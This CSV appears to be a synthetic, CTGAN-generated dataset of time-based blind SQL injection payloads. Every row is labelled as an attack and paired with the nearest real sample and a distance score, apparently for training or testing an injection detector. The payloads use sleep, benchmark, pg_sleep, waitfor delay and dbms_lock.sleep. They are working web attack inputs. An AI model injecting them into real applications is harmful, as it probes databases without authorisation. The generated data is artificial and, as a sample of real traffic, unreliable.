id,label,payload_type,payload,retrieval_method,retrieval_source_id,retrieval_distance
CTGAN_000186,attack,time,"1%"" or 6793  =    (  select 6793 from pg_sleep  (  5   )    )    and ""%""  =  """,nearest_attack_euclidean,R000817,5.775502023268946
CTGAN_000187,attack,time,1   )    )    waitfor delay '0:0:5' and    (    (   1636  =  1636,nearest_attack_euclidean,R000362,6.066899176758783
CTGAN_000188,attack,time,"select sleep  (  5  )   and    (    (   ""%""  =  """,nearest_attack_euclidean,R000707,7.365007809495414
CTGAN_000189,attack,time,"waitfor delay '0:0:5' and    (    (     (  ""%""  =  """,nearest_attack_euclidean,R000878,6.511957678400765
CTGAN_000190,attack,time,1' in boolean mode  )   and 6969  =    (  select 6969 from pg_sleep  (  5   )    )   #,nearest_attack_euclidean,R000206,4.927430281852383
CTGAN_000191,attack,time,select sleep  (  5  )   and 'mlmu'  =  'mlmu,nearest_attack_euclidean,R001105,5.315127782676087
CTGAN_000192,attack,time,1'||  (  select 'wadx' where 4287  =  4287 or sleep  (  5  )  #,nearest_attack_euclidean,R000074,7.682626857993689
CTGAN_000193,attack,time,1  )   or sleep  (  5  )   and   (  2211  =  2211,nearest_attack_euclidean,R001112,5.430608706597437
CTGAN_000194,attack,time,"1%"" or 8466  =  benchmark  (  5000000,md5  (  0x694a4745   )    )    and ""%""  =  """,nearest_attack_euclidean,R000871,7.0800523534900295
CTGAN_000195,attack,time,1   )    )    waitfor delay '0:0:5' and    (    (   1636  =  1636,nearest_attack_euclidean,R000362,5.878256210910817
CTGAN_000196,attack,time,1' or 6793  =    (  select 6793 from pg_sleep  (  5   )    )    and 'ukoc' like 'ukoc,nearest_attack_euclidean,R000227,5.582973585106225
CTGAN_000197,attack,time,"select benchmark  (  5000000,md5  (  0x4c4d6142   )    )    and 'fgcg'  =  'fgcg",nearest_attack_euclidean,R001100,6.7663405174129
CTGAN_000198,attack,time,"1""   )    )     )   waitfor delay '0:0:5' and    (    (     (  ""tuhy"" like ""tuhy",nearest_attack_euclidean,R001109,6.176667847748477
CTGAN_000199,attack,time,1'  )   or sleep  (  5  )   and   (  'fizk'  =  'fizk,nearest_attack_euclidean,R000786,4.953704141500925
CTGAN_000200,attack,time,1' or 6793  =    (  select 6793 from pg_sleep  (  5   )    )    and 'ukoc' like 'ukoc,nearest_attack_euclidean,R000227,5.621085528124154
CTGAN_000201,attack,time,waitfor delay '0:0:5' and    (    (   7619  =  7619,nearest_attack_euclidean,R000282,5.947716879268767
CTGAN_000202,attack,time,1'  )   and sleep  (  5  )   and   (  'xecl' like 'xecl,nearest_attack_euclidean,R000495,4.853441384232717
CTGAN_000203,attack,time,1'  )   as jdmh where 6175  =  6175 rlike sleep  (  5  )  #,nearest_attack_euclidean,R000134,6.963084264018639
CTGAN_000204,attack,time,"1"" or   (  select * from   (  select  (  sleep  (  5   )    )     )  sddo  )  #",nearest_attack_euclidean,R000645,6.426255591507642
CTGAN_000205,attack,time,"1%'  )   or 8466  =  benchmark  (  5000000,md5  (  0x694a4745   )    )    and   (  '%'  =  '",nearest_attack_euclidean,R000375,8.992495347080043
CTGAN_000206,attack,time,1   )    )     )   waitfor delay '0:0:5' and    (    (     (  3481  =  3481,nearest_attack_euclidean,R000981,5.023540898337577
CTGAN_000207,attack,time,select pg_sleep  (  5  )   and    (    (   'vxxg'  =  'vxxg,nearest_attack_euclidean,R000378,5.124962742637942
CTGAN_000208,attack,time,1'   )    )    as hxxm where 3792  =  3792 and sleep  (  5  )  #,nearest_attack_euclidean,R000418,5.5279644229892435
CTGAN_000209,attack,time,"1 or elt  (  6272  =  6272,sleep  (  5   )    )   # klaw",nearest_attack_euclidean,R000880,5.145904720013946
CTGAN_000210,attack,time,1' in boolean mode  )   and 6969  =    (  select 6969 from pg_sleep  (  5   )    )   #,nearest_attack_euclidean,R000206,6.555253223732311
CTGAN_000211,attack,time,"select sleep  (  5  )   and    (    (     (  ""lczw""  =  ""lczw",nearest_attack_euclidean,R000486,6.202433338474706
CTGAN_000212,attack,time,1'  )   or 6793  =    (  select 6793 from pg_sleep  (  5   )    ) ,nearest_attack_euclidean,R001054,5.304809945305363
CTGAN_000213,attack,time,"1""  )   or elt  (  6272  =  6272,sleep  (  5   )    )    and   (  ""dplf"" like ""dplf",nearest_attack_euclidean,R000280,6.008880512328179
CTGAN_000214,attack,time,"1' in boolean mode  )   and elt  (  1210  =  1210,sleep  (  5   )    )   #",nearest_attack_euclidean,R000341,5.161157481442475
CTGAN_000215,attack,time,"1'  )   or 8514  =  benchmark  (  5000000,md5  (  0x544d5a4c   )    )   #",nearest_attack_euclidean,R000231,5.269573481356982
CTGAN_000216,attack,time,1' in boolean mode  )   and 6969  =    (  select 6969 from pg_sleep  (  5   )    )   #,nearest_attack_euclidean,R000206,5.756752157298602
CTGAN_000217,attack,time,"1""  )   or 6793  =    (  select 6793 from pg_sleep  (  5   )    )    and   (  ""lsis"" like ""lsis",nearest_attack_euclidean,R000834,5.8450492851039755
CTGAN_000218,attack,time,"1""   )    )    as nsbu where 6569  =  6569 or sleep  (  5  )  #",nearest_attack_euclidean,R000663,7.431291508574212
CTGAN_000219,attack,time,1   )    )     )   waitfor delay '0:0:5' and    (    (     (  3481  =  3481,nearest_attack_euclidean,R000981,4.689993931515679
CTGAN_000220,attack,time,select pg_sleep  (  5  )   and    (    (   'enpn' like 'enpn,nearest_attack_euclidean,R000057,7.59550195242833
CTGAN_000221,attack,time,"waitfor delay '0:0:5' and    (    (     (  ""%""  =  """,nearest_attack_euclidean,R000878,5.860161717533553
CTGAN_000222,attack,time,1 rlike   (  select * from   (  select  (  sleep  (  5   )    )     )  vwyq  )  #,nearest_attack_euclidean,R000682,5.10676899501838
CTGAN_000223,attack,time,1  )   and sleep  (  5  )  #,nearest_attack_euclidean,R000597,4.821539829758435
CTGAN_000224,attack,time,1'||  (  select 'oxas' from dual where 8284  =  8284 or sleep  (  5   )    )   ||',nearest_attack_euclidean,R000165,6.6462953397960005
CTGAN_000225,attack,time,select sleep  (  5  )   and    (    (     (  'rzjf'  =  'rzjf,nearest_attack_euclidean,R000367,5.471191641059064
CTGAN_000226,attack,time,1 and   (  select * from   (  select  (  sleep  (  5   )    )     )  fzno  ) ,nearest_attack_euclidean,R000288,5.727770120064982
CTGAN_000227,attack,time,waitfor delay '0:0:5' and    (    (     (  8981  =  8981,nearest_attack_euclidean,R000429,5.879429328105805
CTGAN_000228,attack,time,1   )    )     )   waitfor delay '0:0:5' and    (    (     (  3481  =  3481,nearest_attack_euclidean,R000981,4.860143508922827
CTGAN_000229,attack,time,select sleep  (  5  )   and    (    (   'mmvf' like 'mmvf,nearest_attack_euclidean,R000084,5.250084271459227
CTGAN_000230,attack,time,1   )    )    or sleep  (  5  )   and    (    (   8285  =  8285,nearest_attack_euclidean,R000185,6.826957399000426
CTGAN_000231,attack,time,select sleep  (  5  )   and    (    (   3404  =  3404,nearest_attack_euclidean,R000283,5.354596989711302
CTGAN_000232,attack,time,"1' in boolean mode  )   and elt  (  1210  =  1210,sleep  (  5   )    )   #",nearest_attack_euclidean,R000341,5.697399053741786
CTGAN_000233,attack,time,"1  )   or elt  (  6272  =  6272,sleep  (  5   )    )    and   (  8600  =  8600",nearest_attack_euclidean,R001061,6.8788588100594295
CTGAN_000234,attack,time," select sleep  (  5  )   and    (    (   ""wueo""  =  ""wueo",nearest_attack_euclidean,R000534,4.901299404828046
CTGAN_000235,attack,time,1%'  )   or 4240  =    (  select 4240 from pg_sleep  (  5   )    )   --,nearest_attack_euclidean,R000983,5.602050638268775
CTGAN_000236,attack,time,"1"" or 4240  =    (  select 4240 from pg_sleep  (  5   )    )   --",nearest_attack_euclidean,R000401,6.073546702787163
CTGAN_000237,attack,time,"select pg_sleep  (  5  )   and ""%""  =  """,nearest_attack_euclidean,R000347,5.780165327713026
CTGAN_000238,attack,time,1   )    )    waitfor delay '0:0:5' and    (    (   1636  =  1636,nearest_attack_euclidean,R000362,6.370043067190092
CTGAN_000239,attack,time,1 or   (  select * from   (  select  (  sleep  (  5   )    )     )  ydpu  )  # lwfs,nearest_attack_euclidean,R000096,5.5881652160128255
CTGAN_000240,attack,time,"waitfor delay '0:0:5' and    (    (     (  ""lpeo""  =  ""lpeo",nearest_attack_euclidean,R000457,6.226121651016537
CTGAN_000241,attack,time,"1""   )    )     )   waitfor delay '0:0:5' and    (    (     (  ""ckht""  =  ""ckht",nearest_attack_euclidean,R001085,5.923581211628173
CTGAN_000242,attack,time,"1"" and sleep  (  5  )   and ""masm""  =  ""masm",nearest_attack_euclidean,R000716,6.277404306327928
CTGAN_000243,attack,time,1'  )   and 6969  =    (  select 6969 from pg_sleep  (  5   )    )    and   (  'ifvz' like 'ifvz,nearest_attack_euclidean,R000677,7.035469844734045
CTGAN_000244,attack,time,1'   )    )    as hxxm where 3792  =  3792 and sleep  (  5  )  #,nearest_attack_euclidean,R000418,5.96247259458136
CTGAN_000245,attack,time,"1""  )   and elt  (  1210  =  1210,sleep  (  5   )    )    and   (  ""cwwv"" like ""cwwv",nearest_attack_euclidean,R000937,5.433593964424094
CTGAN_000246,attack,time,select sleep  (  5  )   and    (    (   'ilcv'  =  'ilcv,nearest_attack_euclidean,R000364,5.457028433485208
CTGAN_000247,attack,time,select sleep  (  5  )   and    (    (   '%'  =  ',nearest_attack_euclidean,R000193,5.746748464254555
CTGAN_000248,attack,time,select pg_sleep  (  5  )   and    (    (     (  'xobx'  =  'xobx,nearest_attack_euclidean,R000117,4.900235456568175
CTGAN_000249,attack,time,1' in boolean mode  )   and 6969  =    (  select 6969 from pg_sleep  (  5   )    )   #,nearest_attack_euclidean,R000206,5.833558102899637
CTGAN_000250,attack,time,1'  )   and sleep  (  5  )   and   (  'njud'  =  'njud,nearest_attack_euclidean,R000352,4.686134560250978
CTGAN_000251,attack,time, )    )    or sleep  (  __TIME__  )    =  ',nearest_attack_euclidean,R000031,6.888467904646156
CTGAN_000252,attack,time,"1""  )   or 6793  =    (  select 6793 from pg_sleep  (  5   )    )    and   (  ""lsis"" like ""lsis",nearest_attack_euclidean,R000834,6.4008784442781534
CTGAN_000253,attack,time,select sleep  (  5  )   and    (    (     (  'rzjf'  =  'rzjf,nearest_attack_euclidean,R000367,6.8684058070223415
CTGAN_000254,attack,time,"1""   )    )    as gbxx where 2459  =  2459 waitfor delay '0:0:5'--",nearest_attack_euclidean,R001056,5.272061591120509
CTGAN_000255,attack,time,1   )    )    waitfor delay '0:0:5' and    (    (   1636  =  1636,nearest_attack_euclidean,R000362,5.282419482996228
CTGAN_000256,attack,time,1' and 6969  =    (  select 6969 from pg_sleep  (  5   )    ) ,nearest_attack_euclidean,R001046,7.160519986207566
CTGAN_000257,attack,time,1'  )   as jdmh where 6175  =  6175 rlike sleep  (  5  )  #,nearest_attack_euclidean,R000134,6.208679326026575
CTGAN_000258,attack,time,"1""   )    )     )   waitfor delay '0:0:5'--",nearest_attack_euclidean,R000223,5.703832058278137
CTGAN_000259,attack,time,select sleep  (  5  )   and    (    (     (  'rzjf'  =  'rzjf,nearest_attack_euclidean,R000367,5.906903099296967
CTGAN_000260,attack,time,"waitfor delay '0:0:5' and    (    (     (  ""%""  =  """,nearest_attack_euclidean,R000878,7.741978309570027
CTGAN_000261,attack,time,"1""   )    )    waitfor delay '0:0:5' and    (    (   ""koni"" like ""koni",nearest_attack_euclidean,R001103,8.113906400196027
CTGAN_000262,attack,time,1%' rlike sleep  (  5  )  #,nearest_attack_euclidean,R000254,5.5311912590363335
CTGAN_000263,attack,time,"1"" and elt  (  1210  =  1210,sleep  (  5   )    )    and ""zhxm""  =  ""zhxm",nearest_attack_euclidean,R000766,6.263753318501647
CTGAN_000264,attack,time,"1%"" or 6793  =    (  select 6793 from pg_sleep  (  5   )    )    and ""%""  =  """,nearest_attack_euclidean,R000817,6.561144108619748
CTGAN_000265,attack,time,"1',  (  begin if   (  8340  =  8340  )   then dbms_lock.sleep  (  5  )  ",nearest_attack_euclidean,R000310,4.2506550724483425
CTGAN_000266,attack,time,1' or 6793  =    (  select 6793 from pg_sleep  (  5   )    )    and 'ukoc' like 'ukoc,nearest_attack_euclidean,R000227,9.039224318211096
CTGAN_000267,attack,time,1'  )   or 6793  =    (  select 6793 from pg_sleep  (  5   )    )    and   (  'fupe'  =  'fupe,nearest_attack_euclidean,R001086,3.9209739883912045
CTGAN_000268,attack,time,1'  )   as jztg where 1222  =  1222 or sleep  (  5  )  #,nearest_attack_euclidean,R000571,4.871406810220671
CTGAN_000269,attack,time,"1' in boolean mode  )   and elt  (  1210  =  1210,sleep  (  5   )    )   #",nearest_attack_euclidean,R000341,6.589637138263427
CTGAN_000270,attack,time,"1',  (  begin if   (  8340  =  8340  )   then dbms_lock.sleep  (  5  )  ",nearest_attack_euclidean,R000310,5.228584840694785
CTGAN_000271,attack,time,"1"" and sleep  (  5  )   and ""tdid"" like ""tdid",nearest_attack_euclidean,R000121,5.9195197294269075
CTGAN_000272,attack,time,"1"" and elt  (  1210  =  1210,sleep  (  5   )    )    and ""zhxm""  =  ""zhxm",nearest_attack_euclidean,R000766,7.1828940392441325
CTGAN_000273,attack,time,1'  )   and sleep  (  5  )   and   (  'orxt'  =  'orxt,nearest_attack_euclidean,R000499,4.165265894931653
CTGAN_000274,attack,time,1'+  (  select iowv where 6105  =  6105 and sleep  (  5  )  #,nearest_attack_euclidean,R000546,6.178145586170135
CTGAN_000275,attack,time,select pg_sleep  (  5  )   and    (    (     (  'xobx'  =  'xobx,nearest_attack_euclidean,R000117,5.264785612795312
CTGAN_000276,attack,time,1' in boolean mode  )   waitfor delay '0:0:5'--,nearest_attack_euclidean,R000627,6.857243305429079
CTGAN_000277,attack,time,"1""   )    )    as nsbu where 6569  =  6569 or sleep  (  5  )  #",nearest_attack_euclidean,R000663,6.543892247421105
CTGAN_000278,attack,time,1'   )    )    as hzbj where 1725  =  1725 or sleep  (  5  )  #,nearest_attack_euclidean,R000489,6.419792476487949
CTGAN_000279,attack,time,1'||  (  select 'wadx' where 4287  =  4287 or sleep  (  5  )  #,nearest_attack_euclidean,R000074,7.020015729338596
CTGAN_000280,attack,time,"1' or elt  (  6272  =  6272,sleep  (  5   )    )    and 'fvtf' like 'fvtf",nearest_attack_euclidean,R000709,5.332800894129918
CTGAN_000281,attack,time,1   )    )    waitfor delay '0:0:5' and    (    (   1636  =  1636,nearest_attack_euclidean,R000362,5.650849204058803
CTGAN_000282,attack,time," select sleep  (  5  )   and    (    (   ""wueo""  =  ""wueo",nearest_attack_euclidean,R000534,5.724086569326214
CTGAN_000283,attack,time,"1' where 5786  =  5786 and elt  (  1210  =  1210,sleep  (  5   )    )   --",nearest_attack_euclidean,R001062,5.750673537160899
CTGAN_000284,attack,time,"1"" or 6793  =    (  select 6793 from pg_sleep  (  5   )    )   ",nearest_attack_euclidean,R000155,5.633809814286853
CTGAN_000285,attack,time,1%' or 6793  =    (  select 6793 from pg_sleep  (  5   )    )    and '%'  =  ',nearest_attack_euclidean,R000579,6.041173997756915
CTGAN_000286,attack,time,select sleep  (  5  )   and    (    (   'mmvf' like 'mmvf,nearest_attack_euclidean,R000084,6.252982720434517
CTGAN_000287,attack,time,"1%' and elt  (  1210  =  1210,sleep  (  5   )    )    and '%'  =  '",nearest_attack_euclidean,R000564,5.014486565025714
CTGAN_000288,attack,time,"1%"" and elt  (  1210  =  1210,sleep  (  5   )    )    and ""%""  =  """,nearest_attack_euclidean,R000987,6.796950253416907
CTGAN_000289,attack,time,1   )    )    waitfor delay '0:0:5' and    (    (   1636  =  1636,nearest_attack_euclidean,R000362,6.367991081119385
CTGAN_000290,attack,time,"1%"" or 4240  =    (  select 4240 from pg_sleep  (  5   )    )   --",nearest_attack_euclidean,R000861,7.344395616191901
CTGAN_000291,attack,time,"1""   )    )    as yiaw where 2841  =  2841 or sleep  (  5  )  --",nearest_attack_euclidean,R000962,5.97602953080478
CTGAN_000292,attack,time," select sleep  (  5  )   and    (    (     (  ""uvzc"" like ""uvzc",nearest_attack_euclidean,R001048,6.3064839775017
CTGAN_000293,attack,time,select sleep  (  5  )   and '%'  =  ',nearest_attack_euclidean,R001022,6.141888012167334
CTGAN_000294,attack,time,"select sleep  (  5  )   and    (    (     (  ""%""  =  """,nearest_attack_euclidean,R000152,6.6242418247610475
CTGAN_000295,attack,time,"1""   )    )    as nsbu where 6569  =  6569 or sleep  (  5  )  #",nearest_attack_euclidean,R000663,6.776657976634505
CTGAN_000296,attack,time,"1""   )    )    waitfor delay '0:0:5' and    (    (   ""witb""  =  ""witb",nearest_attack_euclidean,R000211,5.119170964569369
CTGAN_000297,attack,time, )    )    or sleep  (  __TIME__  )    =  ',nearest_attack_euclidean,R000031,7.088907327047656
CTGAN_000298,attack,time,"1""  )   or 6793  =    (  select 6793 from pg_sleep  (  5   )    )    and   (  ""lsis"" like ""lsis",nearest_attack_euclidean,R000834,6.487330243855384
CTGAN_000299,attack,time,1%'   )    )    or 4240  =    (  select 4240 from pg_sleep  (  5   )    )   --,nearest_attack_euclidean,R000472,5.839994959362816
CTGAN_000300,attack,time,1'   )    )    waitfor delay '0:0:5' and    (    (   'jcfe'  =  'jcfe,nearest_attack_euclidean,R000988,7.213500124888137
CTGAN_000301,attack,time,"select benchmark  (  5000000,md5  (  0x4c4d6142   )    )    and   (  ""%""  =  """,nearest_attack_euclidean,R000760,7.735289788093218
CTGAN_000302,attack,time,1' or   (  select * from   (  select  (  sleep  (  5   )    )     )  ydpu  ) ,nearest_attack_euclidean,R000728,7.548086854082778
CTGAN_000303,attack,time,waitfor delay '0:0:5' and    (    (     (  8981  =  8981,nearest_attack_euclidean,R000429,7.683223571659863
CTGAN_000304,attack,time,"1   )    )    as cusv where 4871  =  4871 and elt  (  1210  =  1210,sleep  (  5   )    )   --",nearest_attack_euclidean,R000123,6.355389187342415
CTGAN_000305,attack,time,"1 or 8466  =  benchmark  (  5000000,md5  (  0x694a4745   )    )   -- rlas",nearest_attack_euclidean,R000346,7.019329203465677
CTGAN_000306,attack,time,"1' where 4334  =  4334 or elt  (  5873  =  5873,sleep  (  5   )    )   #",nearest_attack_euclidean,R000478,5.493022522161103
CTGAN_000307,attack,time,"select pg_sleep  (  5  )   and    (    (   ""%""  =  """,nearest_attack_euclidean,R001070,6.038156697589315
CTGAN_000308,attack,time,1'  )   or sleep  (  5  )   and   (  'fizk'  =  'fizk,nearest_attack_euclidean,R000786,6.0830212903684995
CTGAN_000309,attack,time,"1""   )    )    as ycvh where 4523  =  4523 and sleep  (  5  )  #",nearest_attack_euclidean,R000852,4.919953457297285
CTGAN_000310,attack,time,select sleep  (  5  )   and    (    (     (  'etzb'  =  'etzb,nearest_attack_euclidean,R001038,2.850218348871768
CTGAN_000311,attack,time,1%'   )    )     )   and sleep  (  5  )  #,nearest_attack_euclidean,R000262,6.325228730036921
CTGAN_000312,attack,time,"1""   )    )    as aozi where 3354  =  3354 waitfor delay '0:0:5'--",nearest_attack_euclidean,R000353,6.873834985234317
CTGAN_000313,attack,time,"1',  (  begin if   (  8340  =  8340  )   then dbms_lock.sleep  (  5  )  ",nearest_attack_euclidean,R000310,7.384971660928758
CTGAN_000314,attack,time,select sleep  (  5  )   and   (  'vwmx'  =  'vwmx,nearest_attack_euclidean,R000925,5.003759920013755
CTGAN_000315,attack,time,select pg_sleep  (  5  )   and   (  'aydg'  =  'aydg,nearest_attack_euclidean,R000167,4.627670156066211
CTGAN_000316,attack,time,1 rlike   (  select * from   (  select  (  sleep  (  5   )    )     )  sgvo  ) ,nearest_attack_euclidean,R000781,6.83588109768957
CTGAN_000317,attack,time,select pg_sleep  (  5  )   and    (    (     (  'xobx'  =  'xobx,nearest_attack_euclidean,R000117,6.876090004142571
CTGAN_000318,attack,time,1   )    )     )   waitfor delay '0:0:5' and    (    (     (  3481  =  3481,nearest_attack_euclidean,R000981,5.27396064925539
CTGAN_000319,attack,time,waitfor delay '0:0:5' and    (    (     (  8981  =  8981,nearest_attack_euclidean,R000429,5.570711931247287
CTGAN_000320,attack,time,select sleep  (  5  )   and    (    (     (  8354  =  8354,nearest_attack_euclidean,R000756,5.585546534394992
CTGAN_000321,attack,time,1  )   waitfor delay '0:0:5' and   (  2993  =  2993,nearest_attack_euclidean,R000205,6.123588806382607
CTGAN_000322,attack,time,"1""  )   where 9086  =  9086 or sleep  (  5  )  #",nearest_attack_euclidean,R001065,5.968084321429677
CTGAN_000323,attack,time,"1""  )   where 6679  =  6679 rlike sleep  (  5  )  #",nearest_attack_euclidean,R000866,6.311772795235819
CTGAN_000324,attack,time,1   )    )    rlike sleep  (  5  )   and    (    (   8773  =  8773,nearest_attack_euclidean,R000308,6.852477457085441
CTGAN_000325,attack,time,"1'+  (  select oogh where 1167  =  1167 or elt  (  5873  =  5873,sleep  (  5   )    )   #",nearest_attack_euclidean,R001034,7.000103621876173
CTGAN_000326,attack,time,waitfor delay '0:0:5' and 'dfzn'  =  'dfzn,nearest_attack_euclidean,R000144,5.00963662299254
CTGAN_000327,attack,time,1   )    )    waitfor delay '0:0:5' and    (    (   1636  =  1636,nearest_attack_euclidean,R000362,5.219281303101799
CTGAN_000328,attack,time,"waitfor delay '0:0:5' and    (    (     (  ""lpeo""  =  ""lpeo",nearest_attack_euclidean,R000457,7.517929833489967
CTGAN_000329,attack,time,1  )   waitfor delay '0:0:5' and   (  2993  =  2993,nearest_attack_euclidean,R000205,5.159351136559292
CTGAN_000330,attack,time,"1""   )    )     )   waitfor delay '0:0:5' and    (    (     (  ""tuhy"" like ""tuhy",nearest_attack_euclidean,R001109,6.67406571427347
CTGAN_000331,attack,time,"1'   )    )    or 8466  =  benchmark  (  5000000,md5  (  0x694a4745   )    )    and    (    (   'jfwt' like 'jfwt",nearest_attack_euclidean,R000640,7.107310504262054
CTGAN_000332,attack,time,waitfor delay '0:0:5' and    (    (   7619  =  7619,nearest_attack_euclidean,R000282,5.034371075777131
CTGAN_000333,attack,time,1'  )   and 6969  =    (  select 6969 from pg_sleep  (  5   )    )    and   (  'ifvz' like 'ifvz,nearest_attack_euclidean,R000677,6.639849738860677
CTGAN_000334,attack,time," select sleep  (  5  )   and   (  ""tlbp""  =  ""tlbp",nearest_attack_euclidean,R000229,5.814570539430613
CTGAN_000335,attack,time,1   )    )    waitfor delay '0:0:5' and    (    (   1636  =  1636,nearest_attack_euclidean,R000362,5.799048551069054
CTGAN_000336,attack,time,1 and 6969  =    (  select 6969 from pg_sleep  (  5   )    )   # pkcp,nearest_attack_euclidean,R001106,7.261600573008928
CTGAN_000337,attack,time,1' or 6793  =    (  select 6793 from pg_sleep  (  5   )    ) ,nearest_attack_euclidean,R000803,5.364438626823672
CTGAN_000338,attack,time,"1"" where 9792  =  9792 rlike   (  select * from   (  select  (  sleep  (  5   )    )     )  vwyq  )  #",nearest_attack_euclidean,R000995,4.615475628857694
CTGAN_000339,attack,time,1   )    )    waitfor delay '0:0:5' and    (    (   1636  =  1636,nearest_attack_euclidean,R000362,5.270628780644249
CTGAN_000340,attack,time,1  )   waitfor delay '0:0:5' and   (  2993  =  2993,nearest_attack_euclidean,R000205,7.350540719042834
CTGAN_000341,attack,time,begin if   (  5624  =  5624  )   then dbms_lock.sleep  (  5  ) ,nearest_attack_euclidean,R000325,4.919725931425207
CTGAN_000342,attack,time,"waitfor delay '0:0:5' and   (  ""dmcu""  =  ""dmcu",nearest_attack_euclidean,R001165,6.707180950154049
CTGAN_000343,attack,time,1'||  (  select 'xemx' from dual where 4683  =  4683 or sleep  (  5  )  #,nearest_attack_euclidean,R000763,5.351564835060949
CTGAN_000344,attack,time,"1' or elt  (  6272  =  6272,sleep  (  5   )    )   ",nearest_attack_euclidean,R000759,6.71135693688154
CTGAN_000345,attack,time,"1%"" and   (  select * from   (  select  (  sleep  (  5   )    )     )  fzno  )   and ""%""  =  """,nearest_attack_euclidean,R000178,5.077901452917737
CTGAN_000346,attack,time,"1' in boolean mode  )   and elt  (  1210  =  1210,sleep  (  5   )    )   #",nearest_attack_euclidean,R000341,5.450226064267199
CTGAN_000347,attack,time,select sleep  (  5  )   and '%'  =  ',nearest_attack_euclidean,R001022,6.468174598473941
CTGAN_000348,attack,time,1   )    )    waitfor delay '0:0:5' and    (    (   1636  =  1636,nearest_attack_euclidean,R000362,4.973871040639191
CTGAN_000349,attack,time,waitfor delay '0:0:5' and    (    (     (  '%'  =  ',nearest_attack_euclidean,R000191,7.064747984221989
CTGAN_000350,attack,time," select sleep  (  5  )   and    (    (     (  ""zlal""  =  ""zlal",nearest_attack_euclidean,R001156,6.620354643363338
CTGAN_000351,attack,time,"waitfor delay '0:0:5' and ""cvqn"" like ""cvqn",nearest_attack_euclidean,R000808,4.702824499327339
CTGAN_000352,attack,time,"1""  )   or elt  (  6272  =  6272,sleep  (  5   )    )    and   (  ""dplf"" like ""dplf",nearest_attack_euclidean,R000280,5.899324965676817
CTGAN_000353,attack,time,1  )   and sleep  (  5  )   and   (  4855  =  4855,nearest_attack_euclidean,R000508,8.074624480474595
CTGAN_000354,attack,time,1' in boolean mode  )   or 6793  =    (  select 6793 from pg_sleep  (  5   )    )   #,nearest_attack_euclidean,R000857,5.658491912917013
CTGAN_000355,attack,time,1 or 4240  =    (  select 4240 from pg_sleep  (  5   )    )   --,nearest_attack_euclidean,R000541,4.838632890663924
CTGAN_000356,attack,time, (  select * from   (  select  (  sleep  (  5   )    )     )  srmq  )   and 'mcrt'  =  'mcrt,nearest_attack_euclidean,R001092,5.545442950348684
CTGAN_000357,attack,time,"1""  )   or 4240  =    (  select 4240 from pg_sleep  (  5   )    )   --",nearest_attack_euclidean,R000106,5.194636188379698
CTGAN_000358,attack,time,1' rlike   (  select * from   (  select  (  sleep  (  5   )    )     )  sgvo  ) ,nearest_attack_euclidean,R000440,4.9336511543821375
CTGAN_000359,attack,time,waitfor delay '0:0:5' and    (    (     (  'hrta'  =  'hrta,nearest_attack_euclidean,R000632,6.283805670568894
CTGAN_000360,attack,time,"1',  (  begin if   (  8340  =  8340  )   then dbms_lock.sleep  (  5  )  ",nearest_attack_euclidean,R000310,6.795569961912234
CTGAN_000361,attack,time,select pg_sleep  (  5  )   and    (    (     (  'xobx'  =  'xobx,nearest_attack_euclidean,R000117,5.652270341180033
CTGAN_000362,attack,time,"1""   )    )     )   and elt  (  3114  =  3114,sleep  (  5   )    )   #",nearest_attack_euclidean,R000697,5.840643229686029
CTGAN_000363,attack,time,1' and 6969  =    (  select 6969 from pg_sleep  (  5   )    ) ,nearest_attack_euclidean,R001046,6.869917626688898
CTGAN_000364,attack,time,1'  )   rlike   (  select * from   (  select  (  sleep  (  5   )    )     )  sgvo  ) ,nearest_attack_euclidean,R000428,6.70412297645503
CTGAN_000365,attack,time,"1""  )   or sleep  (  5  )   and   (  ""fiag"" like ""fiag",nearest_attack_euclidean,R000239,5.335073317224033
CTGAN_000366,attack,time,select sleep  (  5  )   and    (    (   'wyvx'  =  'wyvx,nearest_attack_euclidean,R000620,5.432425406576669
CTGAN_000367,attack,time,1' in boolean mode  )   or 6793  =    (  select 6793 from pg_sleep  (  5   )    )   #,nearest_attack_euclidean,R000857,5.54010672786828
CTGAN_000368,attack,time,1   )    )    waitfor delay '0:0:5' and    (    (   1636  =  1636,nearest_attack_euclidean,R000362,6.752241882002597
CTGAN_000369,attack,time,"1""  )   or elt  (  6272  =  6272,sleep  (  5   )    )    and   (  ""dplf"" like ""dplf",nearest_attack_euclidean,R000280,5.8363041873505015
CTGAN_000370,attack,time,1   )    )    waitfor delay '0:0:5' and    (    (   1636  =  1636,nearest_attack_euclidean,R000362,7.196940514803032
CTGAN_000371,attack,time,1' in boolean mode  )   or sleep  (  5  )  #,nearest_attack_euclidean,R000365,4.382739406315545
